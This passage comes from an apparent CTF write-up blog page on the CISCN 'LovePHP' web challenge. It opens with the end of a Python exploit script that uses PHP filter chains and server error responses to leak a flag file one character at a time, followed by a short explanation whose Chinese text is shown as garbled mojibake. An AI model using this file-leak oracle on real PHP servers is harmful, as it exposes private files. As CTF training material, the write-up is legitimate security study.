                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
          elif s == &#39;O&#39;:
              # 8 - 9
              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
              ss = find_letter(prefix)
              if ss in &#39;CDEFGH&#39;:
                  letter = &#39;8&#39;
              elif ss in &#39;STUVWX&#39;:
                  letter = &#39;9&#39;
              else:
                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
          else:
              err(&#39;wtf&#39;)
  
      print(end=letter)
      o += letter
      sys.stdout.flush()
  
  &quot;&quot;&quot;
  We are done!! :)
  &quot;&quot;&quot;
  
  print()
  d = b64decode(o.encode() + b&#39;=&#39; * 4)
  # remove KR padding
  d = d.replace(b&#39;$)C&#39;,b&#39;&#39;)
  print(b64decode(d))
</code></pre>
</li>
<li><p>  é¦–å…ˆï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„è¿‡æ»¤å™¨é“¾ï¼Œåœ¨HTTPè¯·æ±‚ä¸­æ³¨å…¥ä¸åŒçš„å­—ç¬¦å’Œè¿‡æ»¤å™¨</p>
</li>
<li><p>  å¦‚æœåœ¨åº”ç”¨è¿‡æ»¤å™¨é“¾åæœåŠ¡å™¨è¿”å›500é”™è¯¯ï¼Œé‚£ä¹ˆå¯ä»¥æ¨æ–­å‡ºè¯¥å­—ç¬¦åœ¨flagæ–‡ä»¶ä¸­ï¼Œå› ä¸ºæœåŠ¡å™¨åœ¨æŸäº›æ¡ä»¶ä¸‹æ— æ³•æ­£ç¡®å¤„ç†è¯¥è¾“å…¥ï¼Œä»è€Œå¯¼è‡´é”™è¯¯</p>
</li>
<li><p>  æ ¹æ®æœåŠ¡å™¨çš„å“åº”ï¼Œå¯ä»¥é€ä¸ªåˆ¤æ–­flagæ–‡ä»¶ä¸­çš„å­—ç¬¦</p>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/LovePHP/">http://dezhoutorizhao.github.io/LovePHP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQå›¾ç‰‡20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="æ•°æ®ç»“æ„"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">æ•°æ®ç»“æ„</div></div></a></div><div class="next-post pull-right"><a href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/" title="é€šç”¨æ¼æ´&amp;ä¸šåŠ¡é€»è¾‘æ¼æ´&amp;æ°´å¹³å‚ç›´è¶Šæƒæ¼æ´"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">é€šç”¨æ¼æ´&amp;ä¸šåŠ¡é€»è¾‘æ¼æ´&amp;æ°´å¹³å‚ç›´è¶Šæƒæ¼æ´</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQå›¾ç‰‡20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF webæ‰‹ã€Golangåç«¯å¼€å‘å·¥ç¨‹å¸ˆï¼Œç ”ç©¶å¤šçº¿ç¨‹é«˜å¹¶å‘ã€åˆ†å¸ƒå¼è®¡ç®—ã€æ¸—é€æµ‹è¯•ã€Webå®‰å…¨</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">h3110w0r1då¸ˆå‚…åˆå‘å¸ƒäº†æ–°åšå®¢äº†ï¼Œå¿«å»çœ‹çœ‹ä»–å­¦äº†ä»€ä¹ˆæ–°æŠ€æœ¯å§</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ciscn%E5%88%9D%E8%B5%9B%E2%80%94%E2%80%94LovePHP%E9%A2%98%E7%9B%AEwp"><span class="toc-number">1.</span> <span class="toc-text">Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Docker+K8s/" title="äº‘åŸç”Ÿå®æˆ˜-Docker+K8s">äº‘åŸç”Ÿå®æˆ˜-Docker+K8s</a><time datetime="2024-04-10T12:40:41.235Z" title="å‘è¡¨äº 2024-04-10 20:40:41">2024-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/" title="è®¡ç®—æœºç½‘ç»œå¤ä¹ ">è®¡ç®—æœºç½‘ç»œå¤ä¹ </a><time datetime="2024-04-01T12:39:28.311Z" title="å‘è¡¨äº 2024-04-01 20:39:28">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Metasploit%E5%AE%9E%E6%88%98/" title="Metasploitå®æˆ˜">Metasploitå®æˆ˜</a><time datetime="2024-03-19T08:19:14.901Z" title="å‘è¡¨äº 2024-03-19 16:19:14">2024-03-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023å¤ç›˜">2023å¤ç›˜</a><time datetime="2024-01-10T16:41:46.332Z" title="å‘è¡¨äº 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="ä¾§ä¿¡é“æ”»å‡»">ä¾§ä¿¡é“æ”»å‡»</a><time datetime="2023-09-26T09:03:09.760Z" title="å‘è¡¨äº 2023-09-26 17:03:09">2023-09-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By h3110w0r1d</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">æˆåŠŸçš„ç§˜è¯€åœ¨äºå…´è¶£</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>